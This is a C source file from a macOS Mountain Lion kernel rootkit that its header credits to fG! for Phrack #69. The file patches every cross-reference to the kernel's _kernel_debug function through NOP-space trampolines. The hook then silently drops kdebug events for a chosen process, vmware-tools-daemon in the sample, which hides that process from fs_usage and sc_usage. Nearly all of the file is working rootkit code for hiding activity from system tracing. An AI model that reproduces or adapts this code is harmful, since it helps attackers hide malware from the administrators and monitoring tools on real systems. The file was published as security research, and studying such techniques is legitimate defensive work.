/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * kdebug.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "kdebug.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>
#include <sys/kdebug.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "my_data_definitions.h"
#include "hijacking_utils.h"
#include "utlist.h"
#include "kernel_info.h"
#include "disasm_utils.h"
#include "hash_utils.h"
#include "function_pointers.h"

extern struct kernel_info g_kernel_info;
struct xrefs *g_kdebug_xrefs = NULL;
struct nops  *g_kdebug_nops = NULL;

void tfc_kernel_debug(uint32_t debugid, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3, uintptr_t arg4, __unused uintptr_t arg5);

#define proc_lock(p)		lck_mtx_lock(&(p)->p_mlock)
#define proc_unlock(p)      lck_mtx_unlock(&(p)->p_mlock)

#pragma mark Start and stop functions

kern_return_t
patch_kdebug_internal(void)
{
#if DEBUG_FUNCTIONS
    START
#endif
    /*
     * NOTE: I can't remember why I decided to have one NOP location for each CALL
     *       doesn't make much sense since we only need a single trampoline and then patch all references to it
     *       I leave it here just for fun - each xref to kernel_debug() will have its own trampoline
     */
    int xrefs_count = find_symbol_refs("_kernel_debug", &g_kdebug_xrefs);
    if (xrefs_count < 1) 
    {
#if DEBUG
        //moony_modify//printf("[ERROR] No xrefs avaiable to patch kdebug!\n");
#endif
        return KERN_FAILURE; // bail out if there are no refs or some error happened
    }
    // retrieve free nop space
    int nops_count = find_nop_space(TRAMPOLINE_SIZE, xrefs_count, &g_kdebug_nops);
    if (nops_count < xrefs_count)
    {
#if DEBUG_KDEBUG
        //moony_modify//printf("[ERROR] not enough NOP space found to patch kdebug!\n");
#endif
        return KERN_FAILURE;
    }
    
    if (_kernel_debug == NULL) _kernel_debug = (void*)solve_kernel_symbol(&g_kernel_info, "_kernel_debug");
    // do the magic
    if (hijack_xrefs("_kernel_debug", (mach_vm_address_t)tfc_kernel_debug, g_kdebug_xrefs, g_kdebug_nops, 1)) return KERN_FAILURE;
#if DEBUG_FUNCTIONS
    END
#endif
    return KERN_SUCCESS;
}

kern_return_t
unpatch_kdebug_internal(void)
{
#if DEBUG_FUNCTIONS
    START
#endif
    if(unhijack_xrefs("_kernel_debug", g_kdebug_xrefs, g_kdebug_nops)) return KERN_FAILURE;
    // cleanup the calls structure
    struct xrefs *el, *tmp;
    LL_FOREACH_SAFE(g_kdebug_xrefs, el, tmp)
    {
        LL_DELETE(g_kdebug_xrefs, el);
        _FREE(el, M_TEMP);
    }
    g_kdebug_xrefs = NULL;
    // cleanup the nops list
    struct nops *el_nops, *tmp_nops;
    LL_FOREACH_SAFE(g_kdebug_nops, el_nops, tmp_nops)
    {
        LL_DELETE(g_kdebug_nops, el_nops);
        _FREE(el_nops, M_TEMP);
    }
    g_kdebug_nops = NULL;
#if DEBUG_FUNCTIONS
    END
#endif
    return KERN_SUCCESS;
}

#pragma mark The hijacked function(s)

/*
 * this is just a sample implementation hiding vmware-tools-daemon from fs_usage/sc_usage
 * needs to be reworked for the real world
 */
void 
tfc_kernel_debug(uint32_t debugid, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3, uintptr_t arg4, __unused uintptr_t arg5)
{
#define DBG(id) ((id) >> 24)
    // this could be used to only intercept certain classes
    // XXX: it seems MACH has problems if intercepted, it blocks the system
//    if ( (DBG(debugid) == DBG_MACH) || (DBG(debugid) == DBG_NETWORK) || (DBG(debugid) == DBG_FSYSTEM) || (DBG(debugid) == DBG_BSD)) 
    if ( (DBG(debugid) == DBG_BSD) || (DBG(debugid) == DBG_FSYSTEM) || (DBG(debugid) == DBG_NETWORK) )
    {
        struct proc *p = current_proc();
        proc_lock(p);
        // hash the current process name
        // p_comm has max length of MAXCOMLEN - we could always hash to that size and avoid call to strlen
        uint32_t hash = FNV1A_Hash_Jesteress(&p->p_comm[0], MAXCOMLEN);//strlen(&p->p_comm[0]));
        uint32_t hidehash = FNV1A_Hash_Jesteress("vmware-tools-daemon", MAXCOMLEN);
        if (hash == hidehash)
        {
#if DEBUG_KDEBUG
            // is this always a NULL terminated string?
            //moony_modify//printf("[DEBUG] Hiding %s from kdebug!\n", p->p_comm);
#endif
            proc_unlock(p);
            return;
        }
        proc_unlock(p);
    }
    // no class or process to be intercepted so call original function
    _kernel_debug(debugid, arg1, arg2, arg3, arg4, 0);
}
